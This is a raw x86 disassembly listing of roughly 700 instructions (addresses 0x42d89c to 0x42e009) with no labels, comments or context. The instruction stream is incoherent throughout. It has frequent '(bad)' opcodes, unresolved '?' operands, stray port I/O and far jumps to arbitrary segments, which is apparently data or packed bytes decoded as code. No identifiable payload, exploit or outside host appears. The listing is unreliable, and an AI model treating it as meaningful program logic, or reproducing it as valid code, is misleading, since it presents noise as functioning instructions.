  42d89c:	sbb    eax,0x99a07ef8
  42d8a1:	retf   0x7baf
  42d8a4:	ds pop edx
  42d8a6:	popf   
  42d8a7:	ss dec ebp
  42d8a9:	retf   0x120
  42d8ac:	fistp  WORD PTR [ecx-0x54]
  42d8af:	adc    edi,DWORD PTR [ebx+0x9]
  42d8b2:	push   cs
  42d8b3:	cmp    DWORD PTR ds:0x7dabab21,esi
  42d8b9:	mov    al,0xee
  42d8bb:	or     ah,ah
  42d8bd:	push   cs
  42d8be:	dec    edi
  42d8bf:	jbe    0x42d8d5
  42d8c1:	sbb    eax,0xe2caaee
  42d8c6:	jge    0x42d8b2
  42d8c8:	es loopne 0x42d859
  42d8cb:	test   eax,0xbf6e30db
  42d8d0:	pop    edi
  42d8d1:	adc    al,0x1
  42d8d3:	cli    
  42d8d4:	fdiv   QWORD PTR [ebx-0x12]
  42d8d7:	push   ecx
  42d8d8:	mov    ebx,?
  42d8da:	jge    0x42d8a5
  42d8dc:	dec    DWORD PTR [edi]
  42d8de:	and    BYTE PTR [ecx+0x3b0586d6],ah
  42d8e4:	dec    eax
  42d8e5:	sub    dh,BYTE PTR [bp+di+0x5e]
  42d8e9:	push   esp
  42d8ea:	fdiv   QWORD PTR [esi]
  42d8ec:	fist   DWORD PTR [eax]
  42d8ee:	dec    eax
  42d8ef:	jp     0x42d8d1
  42d8f1:	pop    ebp
  42d8f2:	in     eax,0x21
  42d8f4:	jle    0x42d882
  42d8f6:	(bad)  
  42d8f7:	(bad)  
  42d8f8:	fisubr WORD PTR [ebx+0x675e64b2]
  42d8fe:	add    dl,dl
  42d900:	jae    0x42d8b1
  42d902:	fwait
  42d903:	sbb    ecx,ebx
  42d905:	pop    ecx
  42d906:	jl     0x42d953
  42d908:	or     DWORD PTR [eax-0xced2e61],0x63
  42d90f:	push   ebx
  42d910:	pop    ebx
  42d911:	test   eax,0xc959227f
  42d916:	(bad)  
  42d917:	sub    edi,DWORD PTR [ebp-0x85edfd3]
  42d91d:	or     DWORD PTR [eax+esi*2+0x674cf3b2],0x5e
  42d925:	mov    ah,0xd5
  42d927:	fld    QWORD PTR [edi-0x53]
  42d92a:	jae    0x42d996
  42d92c:	push   esp
  42d92d:	pop    esi
  42d92e:	sbb    edi,edi
  42d930:	and    al,0xc5
  42d932:	out    0x9f,al
  42d934:	jbe    0x42d8f9
  42d936:	outs   dx,BYTE PTR ds:[esi]
  42d937:	add    edx,esi
  42d939:	int3   
  42d93a:	out    dx,al
  42d93b:	sub    esp,eax
  42d93d:	popa   
  42d93e:	dec    esi
  42d93f:	or     BYTE PTR [ebp-0x183284df],dh
  42d945:	(bad)  
  42d946:	in     eax,dx
  42d947:	faddp  st(7),st
  42d949:	pop    ecx
  42d94a:	sub    BYTE PTR [ecx+0x2e56a08a],dh
  42d950:	pop    esi
  42d951:	ins    DWORD PTR es:[edi],dx
  42d952:	cmp    al,0x9
  42d954:	int    0x44
  42d956:	cld    
  42d957:	pop    ecx
  42d958:	repz pusha 
  42d95a:	stos   DWORD PTR es:[edi],eax
  42d95b:	mov    eax,ebp
  42d95d:	xchg   BYTE PTR [ecx+0x2632d0e1],ch
  42d963:	lahf   
  42d964:	xchg   esp,eax
  42d965:	loopne 0x42d8f4
  42d967:	sub    eax,DWORD PTR ds:0xab378586
  42d96d:	pop    edi
  42d96e:	cmp    eax,0xba256beb
  42d973:	(bad)  
  42d974:	leave  
  42d975:	shr    BYTE PTR [edx+0x7ad95ed0],0x5e
  42d97c:	stos   BYTE PTR es:[edi],al
  42d97d:	ds inc esi
  42d97f:	xor    al,0xb0
  42d981:	pusha  
  42d982:	aad    0x36
  42d984:	mov    DWORD PTR [ebp-0x27],esi
  42d987:	dec    esp
  42d988:	push   edx
  42d989:	adc    al,BYTE PTR [ecx]
  42d98b:	repnz sbb BYTE PTR [ebp+0x6e],dh
  42d98f:	in     eax,0x1e
  42d991:	pop    ds
  42d992:	lods   eax,DWORD PTR ds:[esi]
  42d993:	jl     0x42d9e2
  42d995:	pusha  
  42d996:	jmp    0xca7f:0x538320f
  42d99d:	mov    ecx,0xf4e3f59e
  42d9a2:	out    dx,al
  42d9a3:	mov    esp,0xc2208b95
  42d9a8:	add    al,0x60
  42d9aa:	dec    esi
  42d9ab:	mov    eax,ds:0xcdce4d6
  42d9b0:	dec    ecx
  42d9b1:	into   
  42d9b2:	push   0xffffffa9
  42d9b4:	pop    esi
  42d9b5:	mov    ebx,0xd1957719
  42d9ba:	sub    DWORD PTR [ecx+0x523560e4],esi
  42d9c0:	mov    ebx,0x33aaf9a5
  42d9c5:	mov    esi,gs
  42d9c7:	lds    ebp,FWORD PTR [ecx+0x65]
  42d9ca:	mov    bl,0xd
  42d9cc:	imul   ebp,DWORD PTR [ebx],0xffffff98
  42d9cf:	test   al,0x81
  42d9d1:	dec    edi
  42d9d2:	jmp    DWORD PTR [ebx+0x7c160c1]
  42d9d8:	in     eax,dx
  42d9d9:	sbb    esi,ebp
  42d9db:	dec    eax
  42d9dc:	je     0x42da0f
  42d9de:	jge    0x42da4a
  42d9e0:	inc    edx
  42d9e1:	mov    bl,BYTE PTR [ecx-0x60]
  42d9e4:	mov    WORD PTR [ebx+0x24],fs
  42d9e7:	(bad)  
  42d9e9:	ins    DWORD PTR es:[edi],dx
  42d9ea:	dec    edi
  42d9eb:	or     DWORD PTR [esi-0x14af3f1a],0xa740f09c
  42d9f5:	or     bl,al
  42d9f7:	and    eax,DWORD PTR [esi+eax*4]
  42d9fa:	mov    ebp,0x2c409d48
  42d9ff:	mov    eax,ds:0x2af8b910
  42da04:	push   ds
  42da05:	iret   
  42da06:	int3   
  42da07:	fstp   QWORD PTR [esi+0x46]
  42da0a:	xlat   BYTE PTR ds:[ebx]
  42da0b:	dec    esi
  42da0c:	xchg   DWORD PTR [eax],ebp
  42da0e:	or     BYTE PTR [edi+ebp*4+0x5a],dl
  42da12:	out    0x6f,eax
  42da14:	cwde   
  42da15:	js     0x42da34
  42da17:	imul   ebx,DWORD PTR [esi+0x1],0x3668ce13
  42da1e:	adc    BYTE PTR [ecx+0x3151280b],dl
  42da24:	lahf   
  42da25:	pusha  
  42da26:	and    edx,DWORD PTR [ebp+esi*1+0x5f]
  42da2a:	push   ss
  42da2b:	hlt    
  42da2c:	xchg   edx,eax
  42da2d:	test   esi,ebp
  42da2f:	pop    ss
  42da30:	popf   
  42da31:	nop
  42da32:	add    eax,0x2ba93c
  42da37:	mov    eax,ds:0x70a11539
  42da3c:	xchg   ecx,eax
  42da3d:	and    BYTE PTR [edi+0x7],cl
  42da40:	adc    DWORD PTR fs:[edx-0x24],eax
  42da44:	(bad)  
  42da45:	pusha  
  42da46:	daa    
  42da47:	int3   
  42da48:	jg     0x42daaf
  42da4a:	mov    esp,DWORD PTR [ecx+0x7ccde55a]
  42da50:	stc    
  42da51:	ja     0x42dab7
  42da53:	(bad)  
  42da54:	jmp    0x42da63
  42da56:	and    cl,BYTE PTR [ecx]
  42da58:	data16 addr16 (bad) 
  42da5b:	jmp    0x7f3673be
  42da60:	lea    esi,[esi+0x7e]
  42da63:	ret    
  42da64:	aaa    
  42da65:	popa   
  42da66:	push   esi
  42da67:	into   
  42da68:	push   ss
  42da69:	pop    esp
  42da6a:	stos   DWORD PTR es:[edi],eax
  42da6b:	mov    esi,0x7c50cbe2
  42da70:	into   
  42da71:	rcr    DWORD PTR [edi],cl
  42da73:	mov    fs:0x5e4d1cfa,al
  42da79:	jnp    0x42da14
  42da7b:	popf   
  42da7c:	xor    eax,0xde83dcbc
  42da81:	pop    eax
  42da82:	(bad)  
  42da83:	sahf   
  42da84:	sub    al,BYTE PTR [esi]
  42da86:	call   0xd98:0x87075e72
  42da8d:	popf   
  42da8e:	mov    ?,WORD PTR [eax-0x794b9f28]
  42da94:	push   es
  42da95:	(bad)  
  42da96:	xchg   esi,eax
  42da97:	inc    eax
  42da98:	sbb    dl,BYTE PTR [ecx+0x28d324ee]
  42da9e:	xchg   ebp,eax
  42da9f:	retf   
  42daa0:	sub    DWORD PTR [edx-0x20],0xffffffa0
  42daa4:	push   esi
  42daa5:	leave  
  42daa6:	mov    ?,esi
  42daa8:	retf   0x734f
  42daab:	push   ecx
  42daac:	pop    esi
  42daad:	call   0x15570869
  42dab2:	repz in eax,0x76
  42dab5:	push   edx
  42dab6:	sbb    al,0x47
  42dab8:	push   cs
  42dab9:	jb     0x42da49
  42dabb:	push   0xa3b3ba5b
  42dac0:	cmp    DWORD PTR [esi],eax
  42dac2:	xor    al,0x4d
  42dac4:	jmp    DWORD PTR [eax+0x3e]
  42dac7:	pusha  
  42dac8:	inc    ecx
  42dac9:	mov    DWORD PTR [ebp+0x23fa5eba],ebx
  42dacf:	std    
  42dad0:	push   cs
  42dad1:	aas    
  42dad2:	xlat   BYTE PTR cs:[ebx]
  42dad4:	and    eax,0xa686ba49
  42dad9:	dec    edx
  42dada:	ins    BYTE PTR es:[edi],dx
  42dadb:	jle    0x42db3b
  42dadd:	outs   dx,BYTE PTR ds:[esi]
  42dade:	adc    ecx,edi
  42dae0:	ret    0x3aad
  42dae3:	jl     0x42da8a
  42dae5:	pusha  
  42dae6:	xor    ebp,DWORD PTR [esi]
  42dae8:	std    
  42dae9:	daa    
  42daea:	xchg   DWORD PTR [edx-0x3b],esp
  42daed:	cdq    
  42daee:	out    dx,al
  42daef:	int3   
  42daf0:	or     eax,0xf81bb945
  42daf5:	cs mov edx,0x2177899e
  42dafb:	mov    ecx,0xfae31f9e
  42db00:	in     eax,0x75
  42db02:	out    dx,al
  42db03:	lea    ebp,[eax]
  42db05:	out    0x7f,al
  42db07:	sbb    DWORD PTR [eax],eax
  42db09:	mov    al,ds:0xea66a0ef
  42db0e:	stc    
  42db0f:	call   0xd054:0x4dd63736
  42db16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42db17:	rcr    esi,0x1
  42db1a:	sub    eax,edi
  42db1c:	jmp    0x7672c6e2
  42db21:	mov    gs,esi
  42db23:	sbb    ch,BYTE PTR [edi+0x1e179214]
  42db29:	lahf   
  42db2a:	pop    ebp
  42db2b:	test   al,0x2b
  42db2d:	sbb    eax,0x9ff29baf
  42db32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42db33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42db34:	hlt    
  42db35:	mov    esp,?
  42db37:	mov    BYTE PTR [esi+0x41],bl
  42db3a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42db3b:	push   esi
  42db3c:	xor    al,0x3f
  42db3e:	xor    bh,BYTE PTR [ecx+edi*4]
  42db41:	pusha  
  42db42:	test   eax,0x58d33cb
  42db47:	push   0x91eef0c9
  42db4c:	cli    
  42db4d:	fist   DWORD PTR [ecx]
  42db4f:	hlt    
  42db50:	pop    es
  42db51:	pusha  
  42db52:	sub    al,0x69
  42db54:	clc    
  42db55:	pop    ebp
  42db56:	out    dx,eax
  42db57:	sbb    BYTE PTR [esi],dh
  42db59:	addr16 pushf 
  42db5b:	adc    esi,0xecd72910
  42db61:	inc    esp
  42db62:	out    dx,al
  42db63:	pop    ss
  42db64:	and    eax,0xee30716d
  42db69:	inc    esi
  42db6a:	cmp    al,0xa1
  42db6c:	jns    0x42db14
  42db6e:	andps  xmm4,XMMWORD PTR [ebp+0x128f1c40]
  42db75:	fstp   QWORD PTR [edi-0x5e]
  42db78:	addr16 xchg edx,eax
  42db7a:	in     al,0x68
  42db7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42db7d:	arpl   WORD PTR [esi+0x7],sp
  42db80:	ins    BYTE PTR es:[edi],dx
  42db81:	pusha  
  42db82:	jne    0x42db92
  42db84:	sub    ch,BYTE PTR [ebp+eiz*2-0x11412d9e]
  42db8b:	xlat   BYTE PTR ds:[ebx]
  42db8c:	es in  eax,0x67
  42db8f:	(bad)  
  42db90:	repz mov al,0x11
  42db93:	mov    ds:0x241afb18,al
  42db98:	test   eax,0xf764ced7
  42db9d:	ds out dx,al
  42db9f:	inc    edx
  42dba0:	mov    bh,0x4c
  42dba2:	or     cl,BYTE PTR ds:0xa0e943d8
  42dba8:	ficom  DWORD PTR [ebx]
  42dbaa:	lea    ecx,[ebx+0x45]
  42dbad:	mov    ebp,0x255ea38a
  42dbb2:	jecxz  0x42dba3
  42dbb4:	sar    BYTE PTR [esi],0x84
  42dbb7:	repnz pop es
  42dbb9:	mov    bh,0xe0
  42dbbb:	mov    al,ds:0xb7d69c90
  42dbc0:	mov    eax,0xef04824c
  42dbc5:	xor    esi,ebp
  42dbc7:	sahf   
  42dbc8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42dbc9:	pop    esp
  42dbca:	pop    edx
  42dbcb:	push   es
  42dbcc:	mov    eax,ds:0x759a2d24
  42dbd1:	inc    eax
  42dbd2:	clc    
  42dbd3:	rcr    DWORD PTR [esi-0x7a],1
  42dbd6:	mov    al,0x16
  42dbd8:	rol    DWORD PTR [ebx+0x555082f0],1
  42dbde:	in     al,0x40
  42dbe0:	cmp    al,0xeb
  42dbe2:	mov    ecx,0x3d6144e8
  42dbe7:	icebp  
  42dbe8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42dbe9:	aad    0xfa
  42dbeb:	jl     0x42dc2a
  42dbed:	mov    ebp,esi
  42dbef:	test   al,0x6c
  42dbf1:	test   BYTE PTR [ebx+0x0],bl
  42dbf4:	adc    BYTE PTR [ebx-0x1c],ah
  42dbf7:	mov    eax,ds:0x5b29e535
  42dbfc:	rcr    BYTE PTR [esi-0x2d],1
  42dbff:	stos   DWORD PTR es:[edi],eax
  42dc00:	scas   al,BYTE PTR es:[edi]
  42dc01:	mov    bl,0xd9
  42dc03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42dc04:	stc    
  42dc05:	xchg   BYTE PTR [ebx+0x54],dh
  42dc08:	jmp    0x42dc6a
  42dc0a:	inc    edi
  42dc0b:	adc    bl,cl
  42dc0d:	push   esp
  42dc0e:	jb     0x42dc2f
  42dc10:	pop    esi
  42dc11:	or     eax,0x65f0f4b0
  42dc16:	xor    dh,dh
  42dc18:	push   ebp
  42dc19:	and    eax,0xd0e11187
  42dc1e:	out    0xa2,al
  42dc20:	xchg   ebx,edi
  42dc22:	fs retf 
  42dc24:	mov    eax,0x3a60ce78
  42dc29:	cmp    ebp,esi
  42dc2b:	push   esp
  42dc2c:	and    al,0xfd
  42dc2e:	mov    esp,0xeba39de7
  42dc33:	stos   DWORD PTR es:[edi],eax
  42dc34:	and    esi,DWORD PTR [ebx+ebp*2+0x2565270b]
  42dc3b:	dec    esi
  42dc3c:	out    0x23,al
  42dc3e:	cwde   
  42dc3f:	and    ch,BYTE PTR [edi-0x4c]
  42dc42:	pop    esi
  42dc43:	inc    esi
  42dc44:	pop    esi
  42dc45:	add    DWORD PTR [edx-0x12d70097],0x2f59b87c
  42dc4f:	push   si
  42dc51:	mov    dh,0x38
  42dc53:	adc    DWORD PTR [ebx+0x5e05e52d],esi
  42dc59:	push   0x255d0a6d
  42dc5e:	jl     0x42dc26
  42dc60:	pop    edi
  42dc61:	pusha  
  42dc62:	push   edx
  42dc63:	(bad)  [ebp-0x3c42c77b]
  42dc69:	and    BYTE PTR [esi-0x67],dl
  42dc6c:	pop    ecx
  42dc6d:	jmp    0x42dc91
  42dc6f:	clc    
  42dc70:	push   ecx
  42dc71:	popa   
  42dc72:	ss daa 
  42dc74:	repz shl DWORD PTR [edi],cl
  42dc77:	mov    BYTE PTR [edx+edx*2-0x76],dl
  42dc7b:	int3   
  42dc7c:	es loop 0x42dcc6
  42dc7f:	sahf   
  42dc80:	or     al,0x81
  42dc82:	xchg   BYTE PTR [ebp-0x6f0f90c7],ch
  42dc88:	push   cs
  42dc89:	xchg   esi,eax
  42dc8a:	out    0x20,eax
  42dc8c:	ss jns 0x42dc49
  42dc8f:	sub    bl,dh
  42dc91:	pusha  
  42dc92:	fld    st(3)
  42dc94:	and    BYTE PTR [ebp+0x66],al
  42dc97:	xor    dl,dh
  42dc99:	xchg   ecx,eax
  42dc9a:	out    dx,al
  42dc9b:	stos   DWORD PTR es:[edi],eax
  42dc9c:	call   0x4321:0x7a42623e
  42dca3:	mov    eax,ds:0x757c570a
  42dca8:	es push 0xc25e47c9
  42dcae:	jns    0x42dca1
  42dcb0:	rol    DWORD PTR [esi],1
  42dcb2:	sbb    al,0x86
  42dcb4:	xchg   edi,eax
  42dcb5:	pusha  
  42dcb6:	bound  ebp,QWORD PTR [esi+ebp*2+0x13]
  42dcba:	mov    edi,0xf01bcab5
  42dcbf:	imul   eax,edi,0xefc1107a
  42dcc5:	and    al,0xa3
  42dcc7:	and    BYTE PTR [eax],dh
  42dcc9:	popa   
  42dcca:	fist   WORD PTR [ebp+0x15ff8f20]
  42dcd0:	or     BYTE PTR [esi+ebp*8-0x7a38ba3d],bh
  42dcd7:	pop    edi
  42dcd8:	adc    al,0x3d
  42dcda:	dec    edi
  42dcdb:	lahf   
  42dcdc:	mov    ah,0x7a
  42dcde:	cld    
  42dcdf:	jbe    0x42dd5f
  42dce1:	push   eax
  42dce2:	sub    DWORD PTR [ebp-0x7a],ebp
  42dce5:	pop    ds
  42dce6:	out    dx,eax
  42dce7:	icebp  
  42dce8:	adc    eax,0xf6c19194
  42dced:	scas   eax,DWORD PTR es:[edi]
  42dcee:	jmp    0x42dd1c
  42dcf0:	aas    
  42dcf1:	popa   
  42dcf2:	es popa 
  42dcf4:	jae    0x42dd29
  42dcf6:	pop    eax
  42dcf7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42dcf8:	xchg   ecx,eax
  42dcf9:	inc    ebx
  42dcfa:	out    0x46,eax
  42dcfc:	into   
  42dcfd:	loop   0x42dd19
  42dcff:	sbb    esp,edx
  42dd01:	loopne 0x42dc9e
  42dd03:	sub    BYTE PTR [esi],ch
  42dd05:	xchg   esp,eax
  42dd06:	sahf   
  42dd07:	mov    ds:0xe4d5a122,al
  42dd0c:	(bad)  
  42dd0d:	pandn  mm0,QWORD PTR [eax]
  42dd10:	fistp  WORD PTR [edi]
  42dd12:	fsubr  QWORD PTR [ebx*2+0x66f3432e]
  42dd19:	(bad)  
  42dd1a:	into   
  42dd1b:	mov    edx,0xa17b819a
  42dd20:	mov    BYTE PTR [edi-0x9],bh
  42dd23:	(bad)  
  42dd24:	in     eax,dx
  42dd25:	(bad)  [edx]
  42dd27:	test   BYTE PTR [ecx],dh
  42dd29:	jl     0x42dd54
  42dd2b:	cmp    DWORD PTR [ebp+0x86b01db],ecx
  42dd31:	in     eax,0xa9
  42dd33:	mov    ebx,0x50ec2b46
  42dd38:	xchg   ebx,eax
  42dd39:	fmul   DWORD PTR [esi]
  42dd3b:	add    DWORD PTR [eax],ecx
  42dd3d:	sub    al,ch
  42dd3f:	mov    al,ds:0x882af71e
  42dd44:	in     eax,dx
  42dd45:	std    
  42dd46:	add    DWORD PTR [eax],edx
  42dd48:	pop    ebp
  42dd49:	cmp    esi,edi
  42dd4b:	stos   DWORD PTR es:[edi],eax
  42dd4c:	leave  
  42dd4d:	jb     0x42ddca
  42dd4f:	inc    edx
  42dd50:	mov    ds:0xf2cecd5f,al
  42dd55:	mov    ah,0xdd
  42dd57:	fwait
  42dd58:	arpl   WORD PTR [edx-0x685d5c64],ax
  42dd5e:	fadd   DWORD PTR [eax-0x5c2612c1]
  42dd64:	aam    0x9
  42dd66:	imul   edx,DWORD PTR [esi],0xcc5e6262
  42dd6c:	lds    ebp,FWORD PTR [esi+ebp*8-0x45635211]
  42dd73:	dec    edx
  42dd74:	fsub   QWORD PTR [esi]
  42dd76:	cmp    DWORD PTR [ecx-0x5c],ebp
  42dd79:	pusha  
  42dd7a:	fcomp  st(4)
  42dd7c:	mov    edx,0xcbe0b7cb
  42dd81:	call   0x94ee:0x23531f22
  42dd88:	lock sub DWORD PTR [esi],edx
  42dd8b:	repnz es pop ds
  42dd8e:	add    al,0x9f
  42dd90:	aas    
  42dd91:	test   eax,0xfd9e2bfe
  42dd96:	jp     0x42ddd5
  42dd98:	dec    eax
  42dd99:	daa    
  42dd9a:	add    dl,dh
  42dd9c:	ror    DWORD PTR [ecx+0x6e],cl
  42dd9f:	rcl    DWORD PTR [edx+0x48],1
  42dda2:	cli    
  42dda3:	daa    
  42dda4:	aad    0x60
  42dda6:	cmp    al,0x27
  42dda8:	je     0x42dd9c
  42ddaa:	sub    eax,0xee9129c3
  42ddaf:	sub    BYTE PTR [ebp+0x76193058],ch
  42ddb5:	xchg   BYTE PTR ds:0x7f87fa6,cl
  42ddbb:	cs push eax
  42ddbd:	loope  0x42de0a
  42ddbf:	daa    
  42ddc0:	push   edi
  42ddc1:	push   ebx
  42ddc2:	in     eax,dx
  42ddc3:	pop    ss
  42ddc4:	xchg   cl,bl
  42ddc6:	dec    esp
  42ddc7:	ss jmp 0x4560:0xad2166dd
  42ddcf:	ficom  DWORD PTR [edx-0x28ef431f]
  42ddd5:	dec    edx
  42ddd6:	in     eax,dx
  42ddd7:	ins    DWORD PTR es:[edi],dx
  42ddd8:	xchg   ebx,edx
  42ddda:	sbb    BYTE PTR [ebx+0x7c],ah
  42dddd:	call   0x610b6144
  42dde2:	aaa    
  42dde3:	push   0xd2c59628
  42dde8:	out    0xe4,al
  42ddea:	jmp    esi
  42ddec:	add    ebp,0x2e
  42ddef:	xchg   edx,eax
  42ddf0:	adc    ah,BYTE PTR [edi*2-0x249f0d44]
  42ddf7:	clc    
  42ddf8:	cmc    
  42ddf9:	pop    ds
  42ddfa:	aas    
  42ddfb:	cmp    DWORD PTR ds:0xa0fae7ed,edi
  42de01:	jnp    0x42de27
  42de03:	jnp    0x42dde3
  42de05:	xchg   edx,eax
  42de06:	inc    ebp
  42de07:	popf   
  42de08:	mov    dl,0x60
  42de0a:	gs and eax,0xc26c1134
  42de10:	ja     0x42ddeb
  42de12:	out    dx,al
  42de13:	cmp    eax,0xa1c9783
  42de18:	repz add al,BYTE PTR [ebx-0x66]
  42de1c:	shl    DWORD PTR [edi-0x3421a8bb],cl
  42de22:	push   0x20
  42de24:	inc    esp
  42de25:	pop    es
  42de26:	loop   0x42de01
  42de28:	cmp    dl,dh
  42de2a:	mov    fs,WORD PTR [ecx]
  42de2c:	aad    0x23
  42de2e:	(bad)  
  42de2f:	aaa    
  42de30:	adc    al,0x14
  42de32:	in     eax,dx
  42de33:	mov    al,ds:0xcfae27ae
  42de38:	jge    0x42ddf1
  42de3a:	cld    
  42de3b:	bound  edx,QWORD PTR [ebx-0x7c]
  42de3e:	pop    ecx
  42de3f:	or     al,0x9e
  42de41:	mov    ch,bh
  42de43:	mov    ebp,0xa122c0ce
  42de48:	cmc    
  42de49:	mov    ss,WORD PTR [edi+ebx*8-0x9]
  42de4d:	imul   ebp,DWORD PTR [ebp-0xfd49ce7],0xde3317a9
  42de57:	cmp    DWORD PTR [esi+0x57],0xdd8e7c5d
  42de5e:	sbb    al,0xa1
  42de60:	les    edx,FWORD PTR [ebx]
  42de62:	test   BYTE PTR [eax+0x53],0x70
  42de66:	mov    dl,BYTE PTR [eax+0x5e]
  42de69:	(bad)  
  42de6a:	imul   DWORD PTR [eax-0x22]
  42de6d:	jb     0x42dee2
  42de6f:	lods   al,BYTE PTR ds:[esi]
  42de70:	mov    WORD PTR [edi-0x59],ds
  42de73:	xchg   ecx,eax
  42de74:	jp     0x42deb1
  42de76:	stos   DWORD PTR es:[edi],eax
  42de77:	inc    esi
  42de78:	loop   0x42de22
  42de7a:	sbb    ebx,edx
  42de7c:	push   edx
  42de7d:	pop    edx
  42de7e:	lea    ebx,[ecx+0x1e]
  42de81:	add    edx,DWORD PTR [ecx+0x2b78aded]
  42de87:	mov    eax,ds:0x92c1123e
  42de8c:	test   al,0x91
  42de8e:	push   ds
  42de8f:	inc    ebx
  42de90:	scas   al,BYTE PTR es:[edi]
  42de91:	fwait
  42de92:	out    dx,al
  42de93:	mov    ebx,0xa8f7c076
  42de98:	pop    ebx
  42de99:	push   es
  42de9a:	shl    DWORD PTR [eax-0x5bee089],1
  42dea0:	pop    eax
  42dea1:	in     eax,dx
  42dea2:	(bad)  
  42dea3:	(bad)  
  42dea4:	pop    esi
  42dea5:	cmp    al,0x7a
  42dea7:	cmp    al,0x16
  42dea9:	dec    esp
  42deaa:	or     esp,DWORD PTR [edi+ebp*4]
  42dead:	inc    edx
  42deae:	mov    bh,0x58
  42deb0:	call   0xa0924914
  42deb5:	int    0xe7
  42deb7:	ins    BYTE PTR es:[edi],dx
  42deb8:	mov    ds:0x1752ee68,eax
  42debd:	and    DWORD PTR [ebp+0x69],edi
  42dec0:	in     al,dx
  42dec1:	sub    DWORD PTR [edi-0x11ea7c51],esi
  42dec7:	adc    eax,0x73f71d0
  42decc:	mov    eax,0x5e895c8e
  42ded1:	xchg   ebx,eax
  42ded2:	std    
  42ded3:	inc    eax
  42ded4:	ss jge 0x42deef
  42ded7:	sub    al,0x6a
  42ded9:	pusha  
  42deda:	inc    esp
  42dedb:	push   ds
  42dedc:	out    0x23,al
  42dede:	ja     0x42df51
  42dee0:	sbb    BYTE PTR [esi+ebp*8],ch
  42dee3:	jb     0x42df2d
  42dee5:	or     eax,0xf5a57f0f
  42deea:	sub    esp,DWORD PTR [ecx+eiz*4+0x1110182a]
  42def1:	(bad)  
  42def2:	or     al,BYTE PTR cs:[eax-0xb65118b]
  42def9:	pop    eax
  42defa:	das    
  42defb:	fdivp  st(4),st
  42defd:	aas    
  42defe:	aam    0x8f
  42df00:	dec    edx
  42df01:	js     0x42df7c
  42df03:	popa   
  42df04:	inc    ebx
  42df05:	or     BYTE PTR [edi],ah
  42df07:	jg     0x42dec6
  42df09:	mov    edx,0xc112db1e
  42df0e:	cmp    al,0x5d
  42df10:	(bad)  
  42df11:	pop    ecx
  42df12:	repnz int 0x76
  42df15:	ins    DWORD PTR es:[edi],dx
  42df16:	sbb    DWORD PTR [ecx-0x3],esp
  42df19:	js     0x42dea5
  42df1b:	jb     0x42df57
  42df1d:	jnp    0x42df5f
  42df1f:	or     BYTE PTR [edx+ebp*1+0x46],ah
  42df23:	mov    eax,ds:0x5e203443
  42df28:	adc    al,0x5
  42df2a:	push   edx
  42df2b:	fnsave [edx]
  42df2d:	cwde   
  42df2e:	outs   dx,BYTE PTR ds:[esi]
  42df2f:	cmp    esi,DWORD PTR [edx]
  42df31:	xchg   edi,eax
  42df32:	or     bh,al
  42df34:	lods   al,BYTE PTR ds:[esi]
  42df35:	retf   
  42df36:	out    dx,al
  42df37:	test   cl,ch
  42df39:	and    dh,BYTE PTR [edx]
  42df3b:	adc    al,0x14
  42df3d:	data16 (bad) 
  42df3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42df40:	pop    esp
  42df41:	mov    al,ds:0x953b3a2
  42df46:	ds call 0x6a41:0xc9eec90a
  42df4e:	or     BYTE PTR [eax],bl
  42df50:	daa    
  42df51:	sti    
  42df52:	cdq    
  42df53:	mov    eax,ds:0x6b36750f
  42df58:	int    0xe8
  42df5a:	sub    eax,0x47a15e97
  42df5f:	lea    ebp,[ecx+0x3a]
  42df62:	rcl    BYTE PTR [edx-0x54],cl
  42df65:	pop    ecx
  42df66:	jl     0x42df98
  42df68:	xor    esp,0xfffffff2
  42df6b:	nop
  42df6c:	fstp   DWORD PTR [ecx]
  42df6e:	nop
  42df6f:	cmp    DWORD PTR [esi+0x5c],ebx
  42df72:	mov    cl,0xe9
  42df74:	jae    0x42df93
  42df76:	jmp    0xb610:0x4161681f
  42df7d:	pop    esi
  42df7e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42df7f:	test   al,0x3b
  42df81:	addr16 out dx,al
  42df83:	in     al,dx
  42df84:	or     BYTE PTR [edx+esi*8],ah
  42df87:	mov    ds:0xa1832c6e,eax
  42df8c:	xchg   ebp,eax
  42df8d:	inc    esp
  42df8e:	fcmovnbe st,st(0)
  42df90:	neg    DWORD PTR [edx+ebp*4-0x11f40c1a]
  42df97:	enter  0xab02,0x25
  42df9b:	dec    ebx
  42df9c:	shl    bl,cl
  42df9e:	cs mov ebp,0x8f837fea
  42dfa4:	sbb    DWORD PTR [ecx],esp
  42dfa6:	ins    BYTE PTR es:[edi],dx
  42dfa7:	pushf  
  42dfa8:	add    DWORD PTR [esi-0x6f],esp
  42dfab:	jno    0x42e00b
  42dfad:	outs   dx,BYTE PTR ds:[esi]
  42dfae:	xchg   ebp,eax
  42dfaf:	add    edx,esi
  42dfb1:	ret    0xa311
  42dfb4:	dec    ebp
  42dfb5:	popa   
  42dfb6:	ss jmp 0xff7f:0x318c7e51
  42dfbe:	out    dx,al
  42dfbf:	cli    
  42dfc0:	(bad)  
  42dfc1:	sbb    eax,edx
  42dfc3:	jns    0x42dfbe
  42dfc5:	jle    0x42dfc0
  42dfc7:	mov    al,ds:0x8cf65f63
  42dfcc:	jns    0x42e02a
  42dfce:	loopne 0x42e03e
  42dfd0:	pop    esi
  42dfd1:	push   0x3893392a
  42dfd6:	sbb    eax,DWORD PTR [ecx-0x368a9f44]
  42dfdc:	cmovle ebx,DWORD PTR [edi]
  42dfdf:	sub    BYTE PTR [edx+0x13d0eeca],ch
  42dfe5:	dec    ebp
  42dfe6:	inc    ecx
  42dfe7:	test   BYTE PTR [ecx-0x625ea391],dh
  42dfed:	mov    ecx,0xe7b922f3
  42dff2:	(bad)  
  42dff4:	pop    esi
  42dff5:	jl     0x42e003
  42dff7:	popa   
  42dff8:	ret    0x8b17
  42dffb:	xchg   ebp,eax
  42dffc:	jmp    0x42e05a
  42dffe:	popf   
  42dfff:	and    al,0x52
  42e001:	idiv   edi
  42e003:	pusha  
  42e004:	add    eax,0x785922b9
  42e009:	push   eax
